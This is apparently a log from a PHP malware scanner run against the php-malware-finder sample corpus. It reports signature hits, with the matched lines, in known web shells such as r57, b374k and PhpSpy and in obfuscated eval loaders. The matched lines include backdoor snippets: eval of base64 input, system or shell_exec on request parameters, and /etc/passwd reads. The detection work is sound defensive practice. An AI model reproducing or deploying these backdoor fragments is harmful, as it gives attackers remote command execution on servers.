2021-11-17T13:01:41.263Z - info: Adding scanner yara
2021-11-17T13:01:41.264Z - info: Adding scanner akismet
2021-11-17T13:01:41.778Z - info: Loaded 119667 safe file hashes
2021-11-17T13:01:41.779Z - info: Scanning directory my/poc/php-malware-finder/
2021-11-17T13:01:41.904Z - warn: Error parsing file f5:my/poc/php-malware-finder/.git/objects/pack/pack-d22414a8fa4c49fa59ca2920ae6e9dfc67a868cf.idx: Error: Bad terminal sequence "" at line 254 (offset 33349)
2021-11-17T13:01:41.914Z - warn: Error scanning file "f5:my/poc/php-malware-finder/.git/objects/pack/pack-d22414a8fa4c49fa59ca2920ae6e9dfc67a868cf.idx" with scanner "AkismetScanner 
{
  message: 'Bad terminal sequence "\x0B" at line 254 (offset 33349)',
  stack: 'Error: Bad terminal sequence "\x0B" at line 254 (offset 33349)\n' +
    '    at lexer.matchST_IN_SCRIPTING (/home/jetpack-backups/node_modules/php-parser/src/lexer/scripting.js:86:11)\n' +
    '    at lexer.next (/home/jetpack-backups/node_modules/php-parser/src/lexer.js:442:26)\n' +
    '    at lexer.lex (/home/jetpack-backups/node_modules/php-parser/src/lexer.js:362:20)\n' +
    '    at engine.tokenGetAll (/home/jetpack-backups/node_modules/php-parser/src/index.js:218:24)\n' +
    '    at /home/jetpack-backups/built/lib/parse-php-file.js:31:35\n' +
    '    at new Promise (<anonymous>)\n' +
    '    at parsePhpCode (/home/jetpack-backups/built/lib/parse-php-file.js:20:12)\n' +
    '    at /home/jetpack-backups/built/lib/parse-php-file.js:88:64\n' +
    '    at async YaraScanner.scanFile (/home/jetpack-backups/built/lib/scanners/yara-scanner.js:32:27)'
}
2021-11-17T13:01:42.864Z - warn: Error parsing file f5:my/poc/php-malware-finder/.git/objects/pack/pack-d22414a8fa4c49fa59ca2920ae6e9dfc67a868cf.pack: Error: Bad terminal sequence "" at line 1053 (offset 127455)
2021-11-17T13:01:43.395Z - warn: Error scanning file "f5:my/poc/php-malware-finder/.git/objects/pack/pack-d22414a8fa4c49fa59ca2920ae6e9dfc67a868cf.pack" with scanner "AkismetScanner 
{
  message: 'Bad terminal sequence "\x17" at line 1053 (offset 127455)',
  stack: 'Error: Bad terminal sequence "\x17" at line 1053 (offset 127455)\n' +
    '    at lexer.matchST_IN_SCRIPTING (/home/jetpack-backups/node_modules/php-parser/src/lexer/scripting.js:86:11)\n' +
    '    at lexer.next (/home/jetpack-backups/node_modules/php-parser/src/lexer.js:442:26)\n' +
    '    at lexer.lex (/home/jetpack-backups/node_modules/php-parser/src/lexer.js:362:20)\n' +
    '    at engine.tokenGetAll (/home/jetpack-backups/node_modules/php-parser/src/index.js:218:24)\n' +
    '    at /home/jetpack-backups/built/lib/parse-php-file.js:31:35\n' +
    '    at new Promise (<anonymous>)\n' +
    '    at parsePhpCode (/home/jetpack-backups/built/lib/parse-php-file.js:20:12)\n' +
    '    at /home/jetpack-backups/built/lib/parse-php-file.js:88:64\n' +
    '    at async YaraScanner.scanFile (/home/jetpack-backups/built/lib/scanners/yara-scanner.js:32:27)'
}
2021-11-17T13:01:43.411Z - info: Got 32 results: 
2021-11-17T13:01:43.411Z - info: *************************** Result ***************************
2021-11-17T13:01:43.411Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/artificial/bypasses.php found:
2021-11-17T13:01:43.411Z - info:  
{
  id: 113,
  name: 'php_suspicious_call_user_func_001',
  description: "This signature will detect a potentially unsafe or malicious usage of PHP's call_user_func. Please review the file and the function usage and remove the code if malicious. It's also worth mentioning that older versions popular extensions may be running vulnerable calls to this function, please make sure everything is up-to-date."
}
2021-11-17T13:01:43.412Z - info: Lines matched:
2021-11-17T13:01:43.412Z - info: 3:// https://rstforums.com/forum/topic/98500-php-malware-finder/?do=findComment&comment=615687
2021-11-17T13:01:43.412Z - info: 4:print_r(call_user_func_array($_POST['functie'], array($_POST['argv'])));
2021-11-17T13:01:43.412Z - info: 5:
2021-11-17T13:01:43.412Z - info: *************************** Result ***************************
2021-11-17T13:01:43.413Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/artificial/dodgy.php found:
2021-11-17T13:01:43.413Z - info:  
{
  id: 6,
  name: 'Generic_Eval_1',
  description: 'The detected file uses PHP eval function loading encoded functions. If used incorrectly this can allow unauthorized access to your server. We recommend you check the code with the developer or find an up-to-date extension to avoid issues.'
}
2021-11-17T13:01:43.413Z - info: Lines matched:
2021-11-17T13:01:43.413Z - info: 5:set_magic_quotes_runtime ( 0);
2021-11-17T13:01:43.413Z - info: 6:eval(base64_decode($_GET['lol']));
2021-11-17T13:01:43.413Z - info: 7:$a= "SetHandler application/x-httpd-php";
2021-11-17T13:01:43.413Z - info: *************************** Result ***************************
2021-11-17T13:01:43.414Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/artificial/obfuscated.php found:
2021-11-17T13:01:43.414Z - info:  
{
  id: 188,
  name: 'PHP_Generic_BadPattern_11',
  description: 'This code pattern is often used to run a very dangerous shell program on your server. The code in these files needs to be reviewed, and possibly cleaned.'
}
2021-11-17T13:01:43.414Z - info: Lines matched:
2021-11-17T13:01:43.414Z - info: 4:$func="test";$b374k=$func('$x', 'ev'.'al')
2021-11-17T13:01:43.414Z - info: 5:$b=$W('',$S);$b();
2021-11-17T13:01:43.414Z - info: 6:;$pouet($pif,$paf);
2021-11-17T13:01:43.414Z - info: *************************** Result ***************************
2021-11-17T13:01:43.414Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/artificial/obfuscated.php found:
2021-11-17T13:01:43.414Z - info:  
{
  id: 33,
  name: 'php_suspicious_evalGlobals_001',
  description: 'Jetpack has detected code that is often used in web-based shell programs. If you believe the file(s) have been infected they need to be cleaned. If you trust the source of the code, and believe the code is correct, you may hide the notice.'
}
2021-11-17T13:01:43.415Z - info: Lines matched:
2021-11-17T13:01:43.415Z - info: 1:<?php@eval($_GET['p'])
2021-11-17T13:01:43.415Z - info: 2:<?php                                                                                                                                                assert (    $_GET['p']
2021-11-17T13:01:43.415Z - info: *************************** Result ***************************
2021-11-17T13:01:43.415Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/ajaxshell.php found:
2021-11-17T13:01:43.415Z - info:  
{
  id: 88,
  name: 'PHP_Shell_FsAccess',
  description: 'Jetpack has detected a web-based shell (a very dangerous backdoor) which may allow unauthorized access to your server. A shell may be used to infect your server with a virus, or add malware to your site.'
}
2021-11-17T13:01:43.415Z - info: Lines matched:
2021-11-17T13:01:43.415Z - info: 13:'Get server info' => "runcommand('showinfo','GET')",
2021-11-17T13:01:43.415Z - info: 14:'Read /etc/passwd' => "runcommand('etcpasswdfile','GET')",
2021-11-17T13:01:43.415Z - info: 15:'Open ports' => "runcommand('netstat -an | grep -i listen','GET')",
2021-11-17T13:01:43.415Z - info: 348:		}
2021-11-17T13:01:43.415Z - info: 349:		//Read /etc/passwd
2021-11-17T13:01:43.415Z - info: 350:		elseif(strtolower($cmd) == "etcpasswdfile")
2021-11-17T13:01:43.415Z - info: 352:
2021-11-17T13:01:43.415Z - info: 353:			$pw = file('/etc/passwd/');
2021-11-17T13:01:43.415Z - info: 354:			foreach($pw as $line)
2021-11-17T13:01:43.415Z - info: 366:			{
2021-11-17T13:01:43.415Z - info: 367:				passthru($cmd);
2021-11-17T13:01:43.415Z - info: 368:			}
2021-11-17T13:01:43.416Z - info: 382:				{
2021-11-17T13:01:43.416Z - info: 383:					system($cmd);
2021-11-17T13:01:43.416Z - info: 384:				}
2021-11-17T13:01:43.416Z - info: *************************** Result ***************************
2021-11-17T13:01:43.416Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/angel.php found:
2021-11-17T13:01:43.416Z - info:  
{
  id: 149,
  name: 'PHP_Generic_BadPattern_6',
  description: 'This code pattern is commonly present on known malicious code. The code in these files needs to be reviewed, and possibly cleaned.'
}
2021-11-17T13:01:43.416Z - info: Lines matched:
2021-11-17T13:01:43.416Z - info: 1583:	<span style="float:right;"><?php debuginfo();ob_end_flush();?></span>
2021-11-17T13:01:43.416Z - info: 1584:	Powered by <a title="Build 20110502" href="http://www.4ngel.net" target="_blank"><?php echo str_replace('.','','P.h.p.S.p.y');?> 2011</a>. Copyright (C) 2004-2011 <a href="http://www.4ngel.net" target="_blank">Security Angel Team [S4T]</a> All Rights Reserved.
2021-11-17T13:01:43.416Z - info: 1585:</div>
2021-11-17T13:01:43.416Z - info: *************************** Result ***************************
2021-11-17T13:01:43.416Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/angel.php found:
2021-11-17T13:01:43.416Z - info:  
{
  id: 296,
  name: 'PHP_Shell_Known_34',
  description: 'Jetpack has detected a web-based shell (a very dangerous backdoor) which may allow unauthorized access to your server. A shell may be used to infect your server with a virus, or add malware to your site.'
}
2021-11-17T13:01:43.416Z - info: Lines matched:
2021-11-17T13:01:43.416Z - info: 1673:			@ob_start();
2021-11-17T13:01:43.416Z - info: 1674:			@system($cfe);
2021-11-17T13:01:43.416Z - info: 1675:			$res = @ob_get_contents();
2021-11-17T13:01:43.416Z - info: 1678:			@ob_start();
2021-11-17T13:01:43.416Z - info: 1679:			@passthru($cfe);
2021-11-17T13:01:43.417Z - info: 1680:			$res = @ob_get_contents();
2021-11-17T13:01:43.417Z - info: 1682:		} elseif(function_exists('shell_exec')) {
2021-11-17T13:01:43.417Z - info: 1683:			$res = @shell_exec($cfe);
2021-11-17T13:01:43.417Z - info: 1684:		} elseif(function_exists('exec')) {
2021-11-17T13:01:43.417Z - info: 1685:			@exec($cfe,$res);
2021-11-17T13:01:43.417Z - info: 1686:			$res = join("\n",$res);
2021-11-17T13:01:43.417Z - info: 1730:	global $charsetdb;
2021-11-17T13:01:43.417Z - info: 1731:	@ini_set('mysql.connect_timeout', 5);
2021-11-17T13:01:43.417Z - info: 1732:	if(!$link = @mysql_connect($dbhost.':'.$dbport, $dbuser, $dbpass)) {
2021-11-17T13:01:43.417Z - info: *************************** Result ***************************
2021-11-17T13:01:43.417Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/sosyete.php found:
2021-11-17T13:01:43.417Z - info:  
{
  id: 79,
  name: 'PHP_System_Globals',
  description: 'This code pattern is often used to run a very dangerous shell program on your server. The code in these files needs to be reviewed, and possibly cleaned.'
}
2021-11-17T13:01:43.417Z - info: Lines matched:
2021-11-17T13:01:43.417Z - info: 182:ini_restore("open_basedir");
2021-11-17T13:01:43.417Z - info: 183:$fuck=shell_exec($_POST['sosyete']); 
2021-11-17T13:01:43.417Z - info: 184:$mokoko=shell_exec($_POST['fuck']); 
2021-11-17T13:01:43.417Z - info: 185:echo "<pre><h4>";
2021-11-17T13:01:43.417Z - info: *************************** Result ***************************
2021-11-17T13:01:43.417Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/cpanel.php found:
2021-11-17T13:01:43.417Z - info:  
{
  id: 117,
  name: 'php_suspicious_hiddencode_001',
  description: 'This PHP tag follows a suspiciously large block of whitespace. Sometimes malicious code tries to hide itself from view by including a large block of whitespace beforehand, to shift it outside of your view in some editors.'
}
2021-11-17T13:01:43.417Z - info: Lines matched:
2021-11-17T13:01:43.417Z - info: 1:<?php                                                                                                                                                                                                                                                                                                        ~ line truncated ~
2021-11-17T13:01:43.417Z - info: 2:/**
2021-11-17T13:01:43.417Z - info: *************************** Result ***************************
2021-11-17T13:01:43.417Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/cpanel.php found:
2021-11-17T13:01:43.417Z - info:  
{
  id: 146,
  name: 'Generic_Hidden_Code_2',
  description: 'This file contains suspicious hidden code, and should be checked for recent changes, or malicious code. Often hackers try to hide their hack attempts by obfuscating their attack code, to make it harder to detect.'
}
2021-11-17T13:01:43.417Z - info: Lines matched:
2021-11-17T13:01:43.418Z - info: 1:<?php                                                                                                                                                                                                                                                                                                        ~ line truncated ~
2021-11-17T13:01:43.418Z - info: 2:/**
2021-11-17T13:01:43.418Z - info: *************************** Result ***************************
2021-11-17T13:01:43.418Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/b374k.php found:
2021-11-17T13:01:43.418Z - info:  
{
  id: 161,
  name: 'PHP_Generic_BadPattern_7',
  description: 'This file contains suspicious hidden code, and should be checked for recent changes, or malicious code. Often hackers try to hide their hack attempts by obfuscating their attack code, to make it harder to detect.'
}
2021-11-17T13:01:43.418Z - info: Lines matched:
2021-11-17T13:01:43.418Z - info: 9:$GLOBALS['pass'] = "fb621f5060b9f65acf8eb4232e3024140dea2b34"; // sha1(md5('b374k'))
2021-11-17T13:01:43.418Z - info: 10:$func="cr"."eat"."e_fun"."cti"."on";$b374k=$func('$x','ev'.'al'.'("?>".gz'.'in'.'fla'.'te(ba'.'se'.'64'.'_de'.'co'.'de($x)));');$b374k("7P1rm+I4sigKf+9fweSuM1m5qCobDNju6qoZAzb3mzHmMt2nHt9t8A1fMdPz349kGzAkmZXV3Wu9+z379DxTiaVQKCSFQhFSKPTLP1zdLb3rDCdNajj/16PlyKGpfAucb6YjyI+/lb6UBM8TkvcPysE1HU/xHj6UHgLF ~ line truncated ~
2021-11-17T13:01:43.418Z - info: 11:
2021-11-17T13:01:43.418Z - info: *************************** Result ***************************
2021-11-17T13:01:43.418Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/freepbx.php found:
2021-11-17T13:01:43.418Z - info:  
{
  id: 79,
  name: 'PHP_System_Globals',
  description: 'This code pattern is often used to run a very dangerous shell program on your server. The code in these files needs to be reviewed, and possibly cleaned.'
}
2021-11-17T13:01:43.418Z - info: Lines matched:
2021-11-17T13:01:43.418Z - info: 7:echo "";
2021-11-17T13:01:43.418Z - info: 8:@system($_REQUEST["c"]);
2021-11-17T13:01:43.418Z - info: 9:echo "";
2021-11-17T13:01:43.418Z - info: *************************** Result ***************************
2021-11-17T13:01:43.418Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/obfuscators/cipher_design.php found:
2021-11-17T13:01:43.418Z - info:  
{
  id: 6,
  name: 'Generic_Eval_1',
  description: 'The detected file uses PHP eval function loading encoded functions. If used incorrectly this can allow unauthorized access to your server. We recommend you check the code with the developer or find an up-to-date extension to avoid issues.'
}
2021-11-17T13:01:43.418Z - info: Lines matched:
2021-11-17T13:01:43.418Z - info: 1:<?php // Copyright 2016 - Do not attempt to reverse engineer this file. Please contact us for details, quoting the ScriptID. (ScriptID:ID/2016-02-23T12:57:52+00:00) (Generated on 2016-02-23 - http://cipherdesign.co.uk/service/php-obfuscator)
2021-11-17T13:01:43.418Z - info: 2:$OI0IO10101OI0I01=__FILE__;$O10I0I01O1OI01OIOI=72;eval(base64_decode('JE9JMEkwMU8xMElPSU9JMEk9Zm9wZW4oJE9JMElPMTAxMDFPSTBJMDEsJ3JiJyk7JE8xT0lPMTAxMElPSTAxMDE9aW50dmFsKCcwMDIwNTgnKTtmc2VlaygkT0kwSTAxTzEwSU9JT0kwSSxpbnR2YWwoJzAwMDc5NCcpKTtldmFsKGJhc2U2NF9kZWNvZGUoc3RydHIoZnJlYWQoJE9JMEkwMU8xMElPSU9JME ~ line truncated ~
2021-11-17T13:01:43.418Z - info: 3:
2021-11-17T13:01:43.418Z - info: *************************** Result ***************************
2021-11-17T13:01:43.418Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/r57.php found:
2021-11-17T13:01:43.418Z - info:  
{
  id: 296,
  name: 'PHP_Shell_Known_34',
  description: 'Jetpack has detected a web-based shell (a very dangerous backdoor) which may allow unauthorized access to your server. A shell may be used to infect your server with a virus, or add malware to your site.'
}
2021-11-17T13:01:43.419Z - info: Lines matched:
2021-11-17T13:01:43.419Z - info: 58:@set_time_limit(0);
2021-11-17T13:01:43.419Z - info: 59:@ini_set('max_execution_time',0);
2021-11-17T13:01:43.419Z - info: 60:@ini_set('output_buffering',0);
2021-11-17T13:01:43.419Z - info: 61:$safe_mode = @ini_get('safe_mode');
2021-11-17T13:01:43.419Z - info: 981:   {
2021-11-17T13:01:43.419Z - info: 982:    @exec($cfe,$res);
2021-11-17T13:01:43.419Z - info: 983:    $res = join("\n",$res);
2021-11-17T13:01:43.419Z - info: 986:   {
2021-11-17T13:01:43.419Z - info: 987:    $res = @shell_exec($cfe);
2021-11-17T13:01:43.419Z - info: 988:   }
2021-11-17T13:01:43.419Z - info: 991:    @ob_start();
2021-11-17T13:01:43.419Z - info: 992:    @system($cfe);
2021-11-17T13:01:43.419Z - info: 993:    $res = @ob_get_contents();
2021-11-17T13:01:43.419Z - info: 998:    @ob_start();
2021-11-17T13:01:43.419Z - info: 999:    @passthru($cfe);
2021-11-17T13:01:43.419Z - info: 1000:    $res = @ob_get_contents();
2021-11-17T13:01:43.419Z - info: *************************** Result ***************************
2021-11-17T13:01:43.419Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/r57.php found:
2021-11-17T13:01:43.419Z - info:  
{
  id: 68,
  name: 'PHP_Shell_r57',
  description: 'Jetpack has detected a web-based shell (a very dangerous backdoor) which may allow unauthorized access to your server. A shell may be used to infect your server with a virus, or add malware to your site.'
}
2021-11-17T13:01:43.419Z - info: Lines matched:
2021-11-17T13:01:43.419Z - info: 521:echo $head;
2021-11-17T13:01:43.419Z - info: 522:function U_value($value)
2021-11-17T13:01:43.419Z - info: 523: {
2021-11-17T13:01:43.419Z - info: 1863:}
2021-11-17T13:01:43.419Z - info: 1864:else if(($_POST['cmd']!="php_eval")&&($_POST['cmd']!="mysql_dump")&&($_POST['cmd']!="db_show")&&($_POST['cmd']!="db_query")&&($_POST['cmd']!="ftp_brute")){
2021-11-17T13:01:43.419Z - info: 1865: $cmd_rep = ex($_POST['cmd']);
2021-11-17T13:01:43.419Z - info: 1883: }
2021-11-17T13:01:43.419Z - info: 1884:if ($_POST['cmd']=="php_eval"){
2021-11-17T13:01:43.420Z - info: 1885: $eval = @str_replace("<?","",$_POST['php_eval']);
2021-11-17T13:01:43.420Z - info: 1886: $eval = @str_replace("?>","",$eval);
2021-11-17T13:01:43.420Z - info: 1887: @eval($eval);}
2021-11-17T13:01:43.420Z - info: 1888:if ($_POST['cmd']=="db_show")
2021-11-17T13:01:43.420Z - info: 2128:echo $fs.$table_up1.$lang[$language.'_text32'].up_down('id9').$table_up2.$font;
2021-11-17T13:01:43.420Z - info: 2129:echo "<div align=center>".div('id9')."<textarea name=php_eval cols=100 rows=3>";
2021-11-17T13:01:43.420Z - info: 2130:echo (!empty($_POST['php_eval'])?($_POST['php_eval']):("/* delete script */\r\n//unlink(\"r57shell.php\");\r\n//readfile(\"/etc/passwd\");"));
2021-11-17T13:01:43.420Z - info: 2131:echo "</textarea>";
2021-11-17T13:01:43.420Z - info: 2132:echo in('hidden','dir',0,$dir).in('hidden','cmd',0,'php_eval');
2021-11-17T13:01:43.420Z - info: 2133:echo "<br>".ws(1).in('submit','submit',0,$lang[$language.'_butt1']);
2021-11-17T13:01:43.420Z - info: *************************** Result ***************************
2021-11-17T13:01:43.420Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/r57.php found:
2021-11-17T13:01:43.420Z - info:  
{
  id: 111,
  name: 'SQL_Injection',
  description: 'This file contains a possible SQL Injection triggered by an unfiltered usage of REQUESTS; it may not be the result of malicious activity, but should be reviewed.'
}
2021-11-17T13:01:43.420Z - info: Lines matched:
2021-11-17T13:01:43.420Z - info: 1984:     $sql1 .= $sqh;
2021-11-17T13:01:43.420Z - info: 1985:     $res   = @mysql_query("SHOW CREATE TABLE `".$_POST['mysql_tbl']."`", $db);
2021-11-17T13:01:43.420Z - info: 1986:     $row   = @mysql_fetch_row($res);
2021-11-17T13:01:43.420Z - info: 1989:     $sql2 = '';
2021-11-17T13:01:43.420Z - info: 1990:     $res = @mysql_query("SELECT * FROM `".$_POST['mysql_tbl']."`", $db);
2021-11-17T13:01:43.420Z - info: 1991:     if (@mysql_num_rows($res) > 0) {
2021-11-17T13:01:43.420Z - info: *************************** Result ***************************
2021-11-17T13:01:43.420Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/r57.php found:
2021-11-17T13:01:43.420Z - info:  
{
  id: 274,
  name: 'php_suspicious_functions_001',
  description: 'Jetpack has detected a code combination that is likely to be part of known web-based shell (a very dangerous backdoor). Web-based shells may allow unauthorized access to your server.'
}
2021-11-17T13:01:43.421Z - info: Lines matched:
2021-11-17T13:01:43.421Z - info: 57:set_magic_quotes_runtime(0);
2021-11-17T13:01:43.421Z - info: 58:@set_time_limit(0);
2021-11-17T13:01:43.421Z - info: 59:@ini_set('max_execution_time',0);
2021-11-17T13:01:43.421Z - info: 1575:   case 'mod':
2021-11-17T13:01:43.421Z - info: 1576:   @chmod($_POST['param1'],intval($_POST['param2'], 8));
2021-11-17T13:01:43.421Z - info: 1577:   break;
2021-11-17T13:01:43.421Z - info: 1809:  $ci = @curl_init("file://".$_POST['test1_file']."");
2021-11-17T13:01:43.421Z - info: 1810:  $cf = @curl_exec($ci);
2021-11-17T13:01:43.421Z - info: 1811:  echo $cf;
2021-11-17T13:01:43.421Z - info: *************************** Result ***************************
2021-11-17T13:01:43.421Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/r57.php found:
2021-11-17T13:01:43.421Z - info:  
{
  id: 106,
  name: 'php_unsafe_include_globals_001',
  description: 'Unsanitized PHP global variables are being used to include or require other files. If used incorrectly this can allow unauthorized access to your server. We recommend you check the code with the developer or find an up-to-date extension to avoid issues.'
}
2021-11-17T13:01:43.421Z - info: Lines matched:
2021-11-17T13:01:43.421Z - info: 1813:  case 'test2':
2021-11-17T13:01:43.421Z - info: 1814:  @include($_POST['test2_file']);
2021-11-17T13:01:43.421Z - info: 1815:  break;
2021-11-17T13:01:43.421Z - info: *************************** Result ***************************
2021-11-17T13:01:43.421Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/r57.php found:
2021-11-17T13:01:43.421Z - info:  
{
  id: 88,
  name: 'PHP_Shell_FsAccess',
  description: 'Jetpack has detected a web-based shell (a very dangerous backdoor) which may allow unauthorized access to your server. A shell may be used to infect your server with a virus, or add malware to your site.'
}
2021-11-17T13:01:43.421Z - info: Lines matched:
2021-11-17T13:01:43.421Z - info: 715:'ru_text98'=>'??????? ???????????: ',
2021-11-17T13:01:43.421Z - info: 716:'ru_text99'=>'* ? ???????? ?????? ? ?????? ???????????? ??? ???????????? ?? /etc/passwd',
2021-11-17T13:01:43.421Z - info: 717:'ru_text100'=>'???????? ?????? ?? ????????? ??? ??????',
2021-11-17T13:01:43.421Z - info: 840:'eng_text98'=>'success: ',
2021-11-17T13:01:43.421Z - info: 841:'eng_text99'=>'* use username from /etc/passwd for ftp login and password',
2021-11-17T13:01:43.422Z - info: 842:'eng_text100'=>'Send file to remote ftp server',
2021-11-17T13:01:43.422Z - info: 1014:  $users = array();
2021-11-17T13:01:43.422Z - info: 1015:  $rows=file('/etc/passwd');
2021-11-17T13:01:43.422Z - info: 1016:  if(!$rows) return 0;	
2021-11-17T13:01:43.422Z - info: 1479:echo "Disable functions : <b>";
2021-11-17T13:01:43.422Z - info: 1480:if(''==($df=@ini_get('disable_functions'))){echo "<font color=green>NONE</font></b>";}else{echo "<font color=red>$df</font></b>";}
2021-11-17T13:01:43.422Z - info: 1481:$free = @diskfreespace($dir);
2021-11-17T13:01:43.422Z - info: 2129:echo "<div align=center>".div('id9')."<textarea name=php_eval cols=100 rows=3>";
2021-11-17T13:01:43.422Z - info: 2130:echo (!empty($_POST['php_eval'])?($_POST['php_eval']):("/* delete script */\r\n//unlink(\"r57shell.php\");\r\n//readfile(\"/etc/passwd\");"));
2021-11-17T13:01:43.422Z - info: 2131:echo "</textarea>";
2021-11-17T13:01:43.422Z - info: 2138:echo $fs.$table_up1.$lang[$language.'_text33'].up_down('id10').$table_up2.div('id10').$ts;
2021-11-17T13:01:43.422Z - info: 2139:echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test1_file',85,(!empty($_POST['test1_file'])?($_POST['test1_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test1').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
2021-11-17T13:01:43.422Z - info: 2140:echo $te.'</div>'.$table_end1.$fe;
2021-11-17T13:01:43.422Z - info: 2145:echo "<table class=table1 width=100% align=center>";
2021-11-17T13:01:43.422Z - info: 2146:echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test2_file',85,(!empty($_POST['test2_file'])?($_POST['test2_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test2').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
2021-11-17T13:01:43.422Z - info: 2147:echo $te.'</div>'.$table_end1.$fe;
2021-11-17T13:01:43.422Z - info: 2152:echo sr(15,"<b>".$lang[$language.'_text36'].$arrow."</b>",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3_md']):("mysql"))).ws(4)."<b>".$lang[$language.'_text37'].$arrow."</b>".in('text','test3_ml',15,(!empty($_POST['test3_ml'])?($_POST['test3_ml']):("root"))).ws(4)."<b>".$lang[$l ~ line truncated ~
2021-11-17T13:01:43.422Z - info: 2153:echo sr(15,"<b>".$lang[$language.'_text30'].$arrow."</b>",in('text','test3_file',96,(!empty($_POST['test3_file'])?($_POST['test3_file']):("/etc/passwd"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test3').ws(4).in('submit','submit',0,$lang[$language.'_butt8']));
2021-11-17T13:01:43.422Z - info: 2154:echo $te.'</div>'.$table_end1.$fe;
2021-11-17T13:01:43.422Z - info: *************************** Result ***************************
2021-11-17T13:01:43.422Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/classic/r57.php found:
2021-11-17T13:01:43.422Z - info:  
{
  id: 4,
  name: 'PHP_Shell_Known_1',
  description: 'Jetpack has detected a web-based shell (a very dangerous backdoor) which may allow unauthorized access to your server. A shell may be used to infect your server with a virus, or add malware to your site.'
}
2021-11-17T13:01:43.422Z - info: Lines matched:
2021-11-17T13:01:43.422Z - info: 40:$language='eng';
2021-11-17T13:01:43.422Z - info: 41:$a = "http://"; // need some codes
2021-11-17T13:01:43.422Z - info: 42:
2021-11-17T13:01:43.422Z - info: 52:$pass='r57'; // ?????? ???????????? (user password)
2021-11-17T13:01:43.422Z - info: 53:$b = "evilc0der.com"; //need hits "shell created by evilc0ders"
2021-11-17T13:01:43.422Z - info: 54:/******************************************************************************************************/
2021-11-17T13:01:43.422Z - info: 55:$c = "/x.html"; //need shell coder's names
2021-11-17T13:01:43.422Z - info: 56:error_reporting(0);
2021-11-17T13:01:43.422Z - info: *************************** Result ***************************
2021-11-17T13:01:43.423Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/obfuscators/online_php_obfuscator.php found:
2021-11-17T13:01:43.423Z - info:  
{
  id: 23,
  name: 'PHP_Regex_BadPattern_2',
  description: "The detected file uses the preg_replace PHP function along with the e modifier. If used incorrectly this can allow unauthorized access to your server. It's worth mentioning that this modifier was deprecated since PHP 5.5 (which had already reached its end-of-life) and removed since PHP 7.0. We recommend you check the code with the developer or find an up-to-date extension to avoid issues."
}
2021-11-17T13:01:43.423Z - info: Lines matched:
2021-11-17T13:01:43.423Z - info: 1:<?php $payload="83QPy0p0t0hPNs6pSnEPK/F2DkoLMggLDa9MKfcyNCjwLzfwjorIKEhxKbYFAA==";preg_replace('/.*/e',"\x65\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x24\x70\x61\x79\x6c\x6f ~ line truncated ~
2021-11-17T13:01:43.423Z - info: 2:
2021-11-17T13:01:43.423Z - info: *************************** Result ***************************
2021-11-17T13:01:43.423Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/obfuscators/online_php_obfuscator.php found:
2021-11-17T13:01:43.423Z - info:  
{
  id: 146,
  name: 'Generic_Hidden_Code_2',
  description: 'This file contains suspicious hidden code, and should be checked for recent changes, or malicious code. Often hackers try to hide their hack attempts by obfuscating their attack code, to make it harder to detect.'
}
2021-11-17T13:01:43.423Z - info: Lines matched:
2021-11-17T13:01:43.423Z - info: 1:<?php $payload="83QPy0p0t0hPNs6pSnEPK/F2DkoLMggLDa9MKfcyNCjwLzfwjorIKEhxKbYFAA==";preg_replace('/.*/e',"\x65\x76\x61\x6c\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x67\x7a\x69\x6e\x66\x6c\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65\x28\x24\x70\x61\x79\x6c\x6f ~ line truncated ~
2021-11-17T13:01:43.423Z - info: 2:
2021-11-17T13:01:43.423Z - info: *************************** Result ***************************
2021-11-17T13:01:43.423Z - info: In file f5:my/poc/php-malware-finder/php-malware-finder/samples/obfuscators/phpencode.php found:
2021-11-17T13:01:43.423Z - info:  
{
  id: 6,
  name: 'Generic_Eval_1',
  description: 'The detected file uses PHP eval function loading encoded functions. If used incorrectly this can allow unauthorized access to your server. We recommend you check the code with the developer or find an up-to-date extension to avoid issues.'
}
2021-11-17T13:01:43.423Z - info: Lines matched:
